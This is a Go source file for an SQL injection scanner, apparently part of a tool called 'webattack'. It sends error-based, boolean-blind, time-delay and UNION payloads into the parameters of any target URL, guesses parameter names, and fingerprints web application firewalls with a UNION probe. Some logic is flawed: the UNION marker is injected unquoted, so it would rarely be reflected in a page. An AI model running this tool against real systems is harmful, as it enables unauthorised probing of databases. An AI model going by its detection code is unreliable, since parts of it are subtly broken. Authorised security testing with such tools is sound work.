package sqli

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"webattack/pkg/httpclient"
	"webattack/pkg/payloads"
	"webattack/pkg/utils"

	"github.com/fatih/color"
)

// Scanner is the SQL injection scanner
type Scanner struct {
	client  *httpclient.Client
	results []Finding
	mu      sync.Mutex
	verbose bool
}

// Finding represents a potential SQL injection finding
type Finding struct {
	URL       string
	Parameter string
	Payload   string
	Type      string // "error", "boolean", "time", "union"
	Severity  string // "high", "medium", "low"
	Detail    string
}

// NewScanner creates a new SQLi scanner
func NewScanner(client *httpclient.Client, verbose bool) *Scanner {
	return &Scanner{
		client:  client,
		verbose: verbose,
	}
}

// Scan scans a URL for SQL injection vulnerabilities
func (s *Scanner) Scan(targetURL string) ([]Finding, error) {
	s.results = nil

	// Parse URL
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %v", err)
	}

	params := parsed.Query()
	if len(params) == 0 {
		// Try to discover parameters from a GET request
		fmt.Printf("[*] No query parameters found, fetching page to discover forms...\n")
		resp, err := s.client.Get(targetURL)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch URL: %v", err)
		}
		inputs := utils.ExtractInputs(string(resp.Body))
		fmt.Printf("[+] Found %d input fields: %v\n", len(inputs), inputs)
		// Try testing with common parameter names
		for _, name := range []string{"id", "page", "user", "search", "q", "cat", "product"} {
			if utils.ContainsAny(targetURL, inputs) || len(inputs) == 0 {
				testURL := targetURL
				if strings.Contains(targetURL, "?") {
					testURL += "&" + name + "=1"
				} else {
					testURL += "?" + name + "=1"
				}
				s.testParameter(testURL, name, "1")
			}
		}
		return s.results, nil
	}

	// Test each parameter
	var wg sync.WaitGroup
	sem := make(chan struct{}, 5) // Limit concurrency

	for param, values := range params {
		wg.Add(1)
		go func(p string, v []string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			val := ""
			if len(v) > 0 {
				val = v[0]
			}
			s.testParameter(targetURL, p, val)
		}(param, values)
	}

	wg.Wait()
	return s.results, nil
}

func (s *Scanner) testParameter(targetURL, param, value string) {
	marker := utils.RandomHex(8)

	// Phase 1: Error-based detection
	if s.verbose {
		fmt.Printf("[*] Testing parameter '%s' for error-based SQLi...\n", param)
	}
	for _, payload := range payloads.SQLiPayloads {
		testURL := s.injectPayload(targetURL, param, payload)
		resp, err := s.client.Get(testURL)
		if err != nil {
			continue
		}

		bodyLower := strings.ToLower(string(resp.Body))
		// Check for SQL error messages
		errPatterns := []string{
			"sql syntax", "mysql_fetch", "mysql error",
			"ora-", "postgresql", "sqlite",
			"unclosed quotation mark", "odbc",
			"microsoft ole db", "syntax error",
			"warning: mysql", "pg_query()",
			"supplied argument is not a valid",
			"you have an error in your sql",
			"java.sql.sqlexception",
		}
		if utils.ContainsAny(bodyLower, errPatterns) {
			s.addFinding(Finding{
				URL:       testURL,
				Parameter: param,
				Payload:   payload,
				Type:      "error-based",
				Severity:  "high",
				Detail:    "SQL error message detected in response",
			})
			return
		}
	}

	// Phase 2: Boolean-based blind detection
	if s.verbose {
		fmt.Printf("[*] Testing parameter '%s' for boolean-based blind SQLi...\n", param)
	}
	truePayload := injectParam(targetURL, param, value+"' AND '1'='1")
	falsePayload := injectParam(targetURL, param, value+"' AND '1'='2")

	trueResp, err1 := s.client.Get(truePayload)
	falseResp, err2 := s.client.Get(falsePayload)

	if err1 == nil && err2 == nil {
		lenDiff := len(trueResp.Body) - len(falseResp.Body)
		if lenDiff > 20 || lenDiff < -20 {
			s.addFinding(Finding{
				URL:       targetURL,
				Parameter: param,
				Payload:   "' AND '1'='1 / '1'='2",
				Type:      "boolean-based blind",
				Severity:  "high",
				Detail:    fmt.Sprintf("Response length difference: %d bytes", lenDiff),
			})
		}
	}

	// Phase 3: Time-based blind detection
	if s.verbose {
		fmt.Printf("[*] Testing parameter '%s' for time-based blind SQLi...\n", param)
	}
	timePayloads := []string{
		value + "' AND SLEEP(3) --",
		value + "' AND pg_sleep(3) --",
		value + "'; WAITFOR DELAY '0:0:3' --",
	}
	for _, tp := range timePayloads {
		start := time.Now()
		testURL := injectParam(targetURL, param, tp)
		_, err := s.client.Get(testURL)
		elapsed := time.Since(start)
		if err == nil && elapsed > 2500*time.Millisecond {
			s.addFinding(Finding{
				URL:       testURL,
				Parameter: param,
				Payload:   tp,
				Type:      "time-based blind",
				Severity:  "medium",
				Detail:    fmt.Sprintf("Response delayed by %v", elapsed),
			})
			break
		}
	}

	// Phase 4: Union-based detection
	if s.verbose {
		fmt.Printf("[*] Testing parameter '%s' for union-based SQLi...\n", param)
	}
	unionPayloads := []string{
		value + "' UNION SELECT " + marker + " --",
		value + "' UNION ALL SELECT " + marker + " --",
		value + "') UNION SELECT " + marker + " --",
	}
	for _, up := range unionPayloads {
		testURL := injectParam(targetURL, param, up)
		resp, err := s.client.Get(testURL)
		if err == nil && strings.Contains(string(resp.Body), marker) {
			s.addFinding(Finding{
				URL:       testURL,
				Parameter: param,
				Payload:   up,
				Type:      "union-based",
				Severity:  "high",
				Detail:    "Union marker reflected in response",
			})
			break
		}
	}

	_ = marker
}

func (s *Scanner) injectPayload(targetURL, param, payload string) string {
	return injectParam(targetURL, param, payload)
}

func injectParam(targetURL, param, value string) string {
	parsed, _ := url.Parse(targetURL)
	q := parsed.Query()
	q.Set(param, value)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func (s *Scanner) addFinding(f Finding) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.results = append(s.results, f)
}

// PrintResults prints scan results in a formatted way
func PrintResults(results []Finding) {
	if len(results) == 0 {
		color.Yellow("\n[!] No SQL injection vulnerabilities found.")
		return
	}

	color.Red("\n╔══════════════════════════════════════════════════════════╗")
	color.Red("║          SQL INJECTION VULNERABILITIES FOUND             ║")
	color.Red("╚══════════════════════════════════════════════════════════╝\n")

	for i, r := range results {
		fmt.Printf("[%d] ", i+1)
		color.Red("VULNERABLE")
		fmt.Printf("\n")
		fmt.Printf("    URL:        %s\n", r.URL)
		fmt.Printf("    Parameter:  %s\n", r.Parameter)
		fmt.Printf("    Type:       %s\n", r.Type)

		sevColor := color.RedString
		switch r.Severity {
		case "high":
			sevColor = color.RedString
		case "medium":
			sevColor = color.YellowString
		case "low":
			sevColor = color.GreenString
		}
		fmt.Printf("    Severity:   %s\n", sevColor(r.Severity))
		fmt.Printf("    Payload:    %s\n", r.Payload)
		if r.Detail != "" {
			fmt.Printf("    Detail:     %s\n", r.Detail)
		}
		fmt.Println()
	}
}

// GenerateReport generates a text report of findings
func GenerateReport(results []Finding, targetURL string) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("SQL Injection Scan Report\n"))
	sb.WriteString(fmt.Sprintf("=========================\n"))
	sb.WriteString(fmt.Sprintf("Target:  %s\n", targetURL))
	sb.WriteString(fmt.Sprintf("Date:    %s\n", time.Now().Format(time.RFC3339)))
	sb.WriteString(fmt.Sprintf("Findings: %d\n\n", len(results)))

	for i, r := range results {
		sb.WriteString(fmt.Sprintf("[%d] %s - %s\n", i+1, r.Type, r.Severity))
		sb.WriteString(fmt.Sprintf("    URL:       %s\n", r.URL))
		sb.WriteString(fmt.Sprintf("    Parameter: %s\n", r.Parameter))
		sb.WriteString(fmt.Sprintf("    Payload:   %s\n", r.Payload))
		sb.WriteString(fmt.Sprintf("    Detail:    %s\n\n", r.Detail))
	}
	return sb.String()
}

// DetectWAF attempts to detect if a WAF is present
func DetectWAF(client *httpclient.Client, targetURL string) string {
	testURL := targetURL
	if !strings.Contains(testURL, "?") {
		testURL += "?id=1"
	} else {
		testURL += "&test=1"
	}

	// Send a suspicious payload to trigger WAF
	wafPayload := injectParam(testURL, "id", "1 UNION SELECT ALL 1,2,3,4,5 --")
	resp, err := client.Get(wafPayload)
	if err != nil {
		return "unknown"
	}

	body := string(resp.Body)
	headers := fmt.Sprintf("%v", resp.Header)

	wafSignatures := map[string]string{
		"Cloudflare":   "cloudflare|cf-",
		"AWS WAF":      "awselb|awswaf|aws",
		"Akamai":       "akamai|aka-",
		"Imperva":      "incapsula|imperva",
		"F5":           "f5|bigip|big-ip",
		"Fortinet":     "fortigate|fortiweb",
		"ModSecurity":  "mod_security|modsecurity|this request was rejected",
		"Barracuda":    "barracuda",
		"Citrix":       "citrix|ns_af",
		"Sucuri":       "sucuri|cloudproxy",
	}

	combined := strings.ToLower(body + " " + headers)
	for name, sig := range wafSignatures {
		for _, pattern := range strings.Split(sig, "|") {
			if strings.Contains(combined, strings.ToLower(pattern)) {
				return name
			}
		}
	}

	// Check response code - 403/406 often indicates WAF
	if resp.StatusCode == 403 || resp.StatusCode == 406 {
		return "generic (based on response code)"
	}

	return "none detected"
}

// Make sure regexp is used
var _ = regexp.MustCompile
